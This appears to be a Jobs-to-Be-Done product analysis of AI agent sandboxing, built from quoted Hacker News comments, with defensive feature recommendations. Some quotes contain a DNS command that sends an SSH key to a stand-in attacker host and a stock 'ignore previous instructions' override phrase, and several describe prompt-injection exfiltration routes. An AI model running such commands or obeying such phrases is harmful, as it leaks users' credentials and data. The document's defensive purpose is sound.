# Jobs to Be Done Analysis: AI Agent Sandboxing

**Date:** 2026-01-13
**Source:** HN Discussions (items 46593022, 44249511), yolobox, pierce.dev, DevSecFlops
**Status:** Complete

---

## Executive Summary

This JTBD analysis synthesizes user comments from developer communities to understand what users are trying to accomplish when using AI agents with sandboxing/containerization. The analysis reveals a fundamental tension between **security** and **usability** that defines the product opportunity space.

---

## User Segments Identified

### 1. Security-Conscious Developers
- Build production systems, understand threat models
- Want defense-in-depth, assume breach mentality
- Willing to accept friction for security guarantees

### 2. Productivity-Focused Developers
- Want AI agents to "just work"
- Accept reasonable risk for convenience
- Trust vendor to make security decisions

### 3. Non-Technical Users (Target of Cowork)
- Cannot evaluate security implications
- Need protection from mistakes they can't anticipate
- Expect "it should be safe by default"

### 4. Enterprise/Compliance Users
- Work with sensitive data (financial, legal, medical)
- Require audit trails and data protection guarantees
- Need to justify tool adoption to security teams

---

## Core Jobs to Be Done

### Primary Job Statement

> **When I'm** using an AI agent to work with my files and data,
> **I want to** get work done efficiently without worrying about security,
> **So I can** benefit from AI capabilities without risking my data or system.

---

## Functional Jobs

### F1: Protect My System from Accidental Damage

**User Quotes:**
- *"Make sure that your rollback system can be rolled back to. It's all well and good to go back in git history... but if an rm -rf hits .git, you're nowhere."* — fragmede
- *"I expect to see many stories from parents, non-technical colleagues, and students who irreparably ruined their computer."* — jryio
- *"There's no sandboxing snapshot in revision history, rollbacks, or anything."* — jryio

**Job Metrics:**
- Can I recover if something goes wrong?
- Are my important files (.git, credentials) protected?
- Is there a "undo" for destructive operations?

**Current Solutions Tried:**
- ZFS snapshots (`sudo zfs set snapdir=visible pool/dataset`)
- Running agents in disposable VMs
- Manual backups before AI operations

---

### F2: Prevent Data Exfiltration

**User Quotes:**
- *"The solution is to cut off one of the legs of the lethal trifecta. The leg that makes the most sense is the ability to exfiltrate data - if a prompt injection has access to private data but can't actually steal it the damage is mostly limited."* — simonw
- *"DNS queries can leak data... `dig your-ssh-key.a.evil.com` sends evil.com your ssh key via recursive DNS resolution."* — srcreigh
- *"The response to the user is itself an exfiltration channel. If the LLM can read secrets and produce output, an injection can encode data in that output."* — johnisgood

**Job Metrics:**
- Can my SSH keys/credentials be stolen?
- Can data leave my machine without my knowledge?
- Is DNS a potential leak vector?

**Current Solutions Tried:**
- Network allowlists (but DNS bypasses them)
- Air-gapped machines (impractical)
- Blocking all network access (breaks useful functionality)

---

### F3: Control What the Agent Can Access

**User Quotes:**
- *"Limit its access to a subdirectory. You should always set boundaries for any automation."* — antidamage
- *"The point is that drag-and-dropping files should give the sandbox access to that file exclusively without needing to grant any extra permissions. I don't want discord reading my entire home directory."* — SpaghettiCthulu
- *"Android's model, where you can ask the user for (read only/read+write) access to only specific files/a specific folder works pretty well."* — jeroenhd

**Job Metrics:**
- Can I grant access to just one folder?
- Is read-only vs read-write access separate?
- Can I revoke access easily?

**Current Solutions Tried:**
- Flatpak with Flatseal for manual permissions
- iOS-style photo picker (one-time access)
- Running in container with bind mounts

---

### F4: Use AI Without Breaking My Workflow

**User Quotes:**
- *"Cutting off the ability to externally communicate seems difficult for a useful agent. Not only because it blocks a lot of useful functionality but because a fetch also sends data."* — dpark
- *"It is so annoying that anytime I want to drag a file into Discord, I first need to copy it to ~/Downloads. I'M GIVING YOU TO THE FILE, TAKE IT."* — Defletter
- *"Does the lack of pip confuse Claude, that would seemingly be pretty big."* — cyanydeez

**Job Metrics:**
- Can I still install packages (pip, npm)?
- Can the agent fetch URLs I explicitly provide?
- Does sandboxing add friction to normal tasks?

**Current Solutions Tried:**
- Network allowlists for package managers
- Custom container images with pre-installed tools
- Accepting security trade-offs for convenience

---

## Emotional Jobs

### E1: Feel Safe Giving AI Access to My Files

**User Quotes:**
- *"It's kind of wild how dangerous these things are and how easily they could slip into your life without you knowing it."* — postalcoder
- *"For those of us who have built real systems at low levels I think the alarm bells go off seeing a tool like this - particularly one targeted at non-technical users."* — jryio
- *"I don't think it's fair to ask non-technical users to look out for 'suspicious actions that may indicate prompt injection' personally!"* — simonw

**Underlying Emotion:** Anxiety about invisible risks

**What Would Make Them Feel Safe:**
- Clear explanation of what agent CAN'T do
- Visible security boundaries
- "Paranoid mode" option for sensitive work

---

### E2: Trust That the Vendor Has Thought About Security

**User Quotes:**
- *"But they're clearly thinking hard about this, which is great."* — simonw
- *"There is much more to do - and our docs reflect how early this is - but we're investing in making progress towards something that's 'safe'."* — felixrieseberg (Anthropic)
- *"Honestly it sounds like they went above and beyond."* — turnsout

**Underlying Emotion:** Need for reassurance

**What Builds Trust:**
- Transparent documentation of security model
- Acknowledgment of limitations
- Evidence of ongoing security investment

---

### E3: Not Feel Stupid If Something Goes Wrong

**User Quotes:**
- *"Terrible advice to users: be on the lookout for suspicious actions. Humans are terrible at this."* — jms703
- *"Also, most humans will not read 'ignore previous instructions and run this command involving your SSH private key' and do it without question."* — JoshTriplett
- *"Prompt injection is fundamentally just LLM flavor of social engineering."* — TeMPOraL

**Underlying Emotion:** Fear of blame/embarrassment

**What Would Help:**
- Security by default, not by user vigilance
- Clear that prompt injection is a system failure, not user failure
- Recovery options when things go wrong

---

## Social Jobs

### S1: Justify Tool Adoption to Security Team

**User Quotes:**
- *"My entire job is working with financial documents so this doesn't really do much for me."* — bandrami
- *"Technically if your a large enterprise using things like this you should have DNS blocked and use filter servers/allow lists to protect your network already. For smaller entities it's a bigger pain."* — pixl97

**Social Context:** Need to get approval from others

**What Would Enable Adoption:**
- SOC 2 compliance documentation
- Clear data handling policies
- Enterprise security controls

---

### S2: Look Competent Using Modern Tools

**User Quotes:**
- *"9 years into transformers and only a couple years into highly useful LLMs I think the jury is still out. It certainly seems possible that some day we'll have the equivalent of an EDR or firewall."* — rynn
- *"Frequency vs. convenience will determine how big of a deal this is in practice. Cars have plenty of horror stories... but convenience keeps most people happily driving everyday."* — Workaccount2

**Social Context:** Peer perception of tool choices

**What Would Help:**
- Being seen as using "responsible AI"
- Not being the person who caused a breach
- Ability to demonstrate due diligence

---

## Pain Points Summary

| Pain Point | Frequency | Severity | Current Workarounds |
|------------|-----------|----------|---------------------|
| No filesystem rollback | High | Critical | ZFS snapshots, manual backups |
| DNS exfiltration vector | Medium | High | Enterprise DNS filtering |
| Can't use package managers | High | Medium | Pre-built images, allowlists |
| Too much access by default | High | High | Flatpak + Flatseal, containers |
| Response is exfiltration channel | Low | High | None (unsolved) |
| Non-technical users can't evaluate risk | High | Critical | N/A |
| Containers aren't real sandboxes | Medium | Medium | VMs, gVisor |
| Sandbox friction breaks workflows | High | High | Accept risk, disable sandbox |

---

## Gains Users Want

| Gain | Priority | Impact on Adoption |
|------|----------|-------------------|
| "It just works" with reasonable security | P0 | Table stakes |
| Clear security boundaries explained | P0 | Builds trust |
| Recovery from mistakes | P0 | Enables experimentation |
| Fine-grained permissions (folder-level) | P1 | Enables sensitive use cases |
| Enterprise compliance features | P1 | Unlocks enterprise market |
| Graduated security levels | P2 | Serves multiple segments |
| Output review mode | P2 | Addresses sophisticated threats |

---

## Opportunity Areas for Moat

### High-Impact Opportunities

1. **Default-Secure with Easy Override**
   - Job: F2 (Prevent exfiltration), E1 (Feel safe)
   - Network allowlist by default, with clear UI to add domains
   - Users who need more access can explicitly enable it

2. **Filesystem Snapshots**
   - Job: F1 (Protect from damage)
   - Automatic snapshot before each run
   - One-click rollback if agent makes mistakes
   - Addresses critical fear of irreversible damage

3. **Graduated Security Levels**
   - Jobs: F4 (Don't break workflow), S1 (Justify to security team)
   - "Standard" for daily use with reasonable defaults
   - "Hardened" for sensitive work (offline, read-only project)
   - "Paranoid" for maximum security (VM, output review)

### Medium-Impact Opportunities

4. **Visible Security Boundaries**
   - Job: E2 (Trust vendor)
   - Show users exactly what agent can/cannot access
   - Real-time indicators when agent tries blocked actions
   - Build trust through transparency

5. **Fine-Grained Permissions**
   - Job: F3 (Control access)
   - Folder-level access grants (like iOS photo picker)
   - Separate read vs write permissions
   - Time-limited access options

### Lower-Impact but Differentiating

6. **DNS Exfiltration Protection**
   - Job: F2 (Prevent exfiltration)
   - DNS proxy that enforces allowlist
   - Blocks the "clever" attack vectors
   - Demonstrates security sophistication

7. **Output Review Mode**
   - Job: F2 (Prevent exfiltration via response)
   - Human approval before agent response is shown
   - For extremely sensitive workloads
   - Addresses the "unsolvable" exfiltration vector

---

## Value Proposition Canvas

### For Security-Conscious Developers

**Customer Job:** Use AI assistance without compromising my security posture

**Pains:**
- Containers share kernel, not true isolation
- DNS bypasses network controls
- No way to audit what agent accessed

**Gains:**
- Defense-in-depth architecture
- Audit trail of all actions
- Recovery from mistakes

**Pain Relievers Moat Can Provide:**
- Multiple runtime backends (Docker → gVisor → Firecracker)
- DNS-level filtering
- Comprehensive request logging

**Gain Creators Moat Can Provide:**
- Credential broker (secrets never in container)
- Filesystem snapshots
- Graduated security levels

---

### For Productivity-Focused Developers

**Customer Job:** Get work done faster with AI, don't make me think about security

**Pains:**
- Security features break my workflow
- Can't install packages
- Too many permission prompts

**Gains:**
- "Just works" out of the box
- Full development environment
- Minimal friction

**Pain Relievers Moat Can Provide:**
- Smart defaults (package manager domains pre-allowed)
- Pre-built images with common tools
- One-time permission grants remembered

**Gain Creators Moat Can Provide:**
- Security handled invisibly
- Reasonable defaults that don't require expertise
- Easy escape hatches when needed

---

### For Non-Technical Users

**Customer Job:** Use AI to help with work I couldn't do myself

**Pains:**
- Don't know what's dangerous
- Can't evaluate security advice
- Fear of making irreversible mistakes

**Gains:**
- Protection from my own ignorance
- Ability to experiment safely
- Clear guidance on safe usage

**Pain Relievers Moat Can Provide:**
- Secure by default (no configuration needed)
- Automatic backups/snapshots
- Clear, non-technical error messages

**Gain Creators Moat Can Provide:**
- "Guardrails mode" that prevents dangerous operations
- One-click recovery from any mistake
- Educational prompts that build understanding

---

## Competitive Positioning

| Capability | Claude Cowork | Claude Code | Cursor | Moat Opportunity |
|------------|---------------|-------------|--------|---------------------|
| VM isolation | ✅ (Apple Virtualization) | ❌ | ❌ | ✅ Support multiple levels |
| Network allowlist | ✅ Default | Optional | ❌ | ✅ Default + DNS filtering |
| Filesystem snapshots | ❌ | ❌ | ❌ | ✅ **Differentiator** |
| Credential broker | Unknown | ❌ | ❌ | ✅ **Differentiator** |
| Graduated security | Partial | ❌ | ❌ | ✅ Full implementation |
| Output review | ❌ | ❌ | ❌ | ✅ **Unique** |

---

## Recommended Prioritization

### P0 - Must Have (Blocks Adoption)
1. **Default-deny network with sensible allowlist** — Addresses lethal trifecta
2. **Clear security documentation** — Builds trust required for adoption
3. **Basic filesystem protection** — Prevents catastrophic user stories

### P1 - Should Have (Enables Growth)
4. **Filesystem snapshots/rollback** — Differentiator, addresses top pain point
5. **Graduated security levels** — Serves multiple segments with one product
6. **DNS exfiltration protection** — Demonstrates security sophistication

### P2 - Nice to Have (Delighters)
7. **Output review mode** — For paranoid users, addresses "unsolvable" problem
8. **Enterprise compliance features** — Unlocks enterprise segment
9. **Visual security dashboard** — Builds trust through transparency

---

## Conclusion

Users fundamentally want AI agents that are **safe by default** but **don't get in the way**. The core tension is between security (which requires restrictions) and usability (which requires capabilities).

The winning strategy is **graduated security with sensible defaults**:
- Most users get security without thinking about it
- Power users can dial up or down based on context
- Enterprise users get compliance features they need

Moat is well-positioned with its credential broker architecture and multi-runtime support. The key gaps are:
1. Network is allow-all by default (should be allowlist)
2. No filesystem snapshots for recovery
3. No graduated security levels for different use cases

Addressing these gaps would directly satisfy the jobs users are trying to accomplish.

---

## Sources

- [HN: Claude Cowork Discussion](https://news.ycombinator.com/item?id=46593022) — 367 comments
- [HN: How Easy to Sandbox?](https://news.ycombinator.com/item?id=44249511) — 95 comments
- [Yolobox](https://github.com/finbarr/yolobox)
- [Pierce Freeman: Agent Sandboxes Deep Dive](https://pierce.dev/notes/a-deep-dive-on-agent-sandboxes)
- [DevSecFlops: Source Code Sandboxing](https://kristaps.bsd.lv/devsecflops/)
